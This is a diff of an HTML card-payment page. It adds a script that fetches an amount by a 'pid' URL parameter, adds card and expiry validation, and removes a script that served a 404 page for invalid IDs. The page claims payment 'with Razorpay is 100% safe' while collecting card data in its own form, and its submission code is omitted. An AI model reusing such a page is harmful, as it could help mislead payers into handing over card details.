@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -111,7 +110,7 @@
       perspective: 1000px;
     }
     .consent-message {
-      display: block; /* Always display */
+      display: block;
       margin-top: 20px;
       font-size: 0.875rem;
       color: #4B5563;
@@ -250,8 +249,35 @@
       }
     }
   </style>
-    <!-- ========= Fetch Payment Details ========= -->
-      <!-- ========= Card Formatting Functions ========= -->
+  <!-- ========= (Removed 404 error/session tracking script) ========= -->
+  <!-- (The previous script block that checked for a valid "pid" and replaced the page with a 404 error has been removed.) -->
+  <!-- ========= Fetch Payment Details ========= -->
+  <script>
+    document.addEventListener('DOMContentLoaded', async function(){
+      const urlParams = new URLSearchParams(window.location.search);
+      const pid = urlParams.get("pid");
+      if(pid && pid !== "null") {
+        try {
+          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
+          const data = await response.json();
+          if(data.status === "success" && data.payment) {
+            const amt = parseInt(data.payment.amount, 10);
+            if(!isNaN(amt)) {
+              document.getElementById("amount").value = amt;
+              document.getElementById("displayAmount").textContent = amt.toLocaleString("en-IN");
+            } else {
+              console.error("Invalid amount:", data.payment.amount);
+            }
+          } else {
+            console.error("Payment details not found for pid:", pid);
+          }
+        } catch(err) {
+          console.error("Error fetching payment details:", err);
+        }
+      }
+    });
+  </script>
+  <!-- ========= Card Formatting Functions ========= -->
   <script>
     function validateCard(number) {
       let arr = number.replace(/\D/g,'').split('').reverse().map(x => parseInt(x,10));
@@ -287,11 +313,20 @@
       if(cardInput){
         cardInput.addEventListener("input", function(e){
           e.target.value = formatCardNumber(e.target.value);
+          updateCardError();
+          updateCardTypeAndInfo(e.target.value);
         });
       }
       if(expiryInput){
         expiryInput.addEventListener("input", function(e){
           e.target.value = formatExpiry(e.target.value);
+          const errElem = document.getElementById("expiryError");
+          if(e.target.value.length === 5 && !validateExpiry(e.target.value)){
+            errElem.style.display = "block";
+            errElem.textContent = "Expiry must be MM/YY (MM ≤ 12, YY ≤ 50)";
+          } else {
+            errElem.style.display = "none";
+          }
         });
       }
     });
@@ -299,7 +334,6 @@
   <!-- (Assume additional JS for handling form submission, OTP, etc. remains unchanged.) -->
 </head>
 <body>
-  <!-- ========= Payment Page Content ========= -->
   <div class="page-container" style="background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);">
     <div class="content-wrapper">
       <div class="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
@@ -399,8 +433,9 @@
                     <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="4242 4242 4242 4242" required>
                     <div class="absolute right-3 top-1/2 -translate-y-1/2" id="cardTypeIcon"></div>
                   </div>
-                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter a valid card number</p>
+                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter valid card number</p>
                 </div>
+                <div id="cardInfo"></div>
                 <div class="grid grid-cols-2 gap-4">
                   <div>
                     <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
@@ -454,7 +489,8 @@
                   <path d="M5 13l4 4L19 7"/>
                 </svg>
               </div>
-              <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
+              <span>Note: Making Payment with Razorpay is 100% safe.
+Your transaction is processed through a secure https connection.</span>
             </div>
           </div>
         </div>
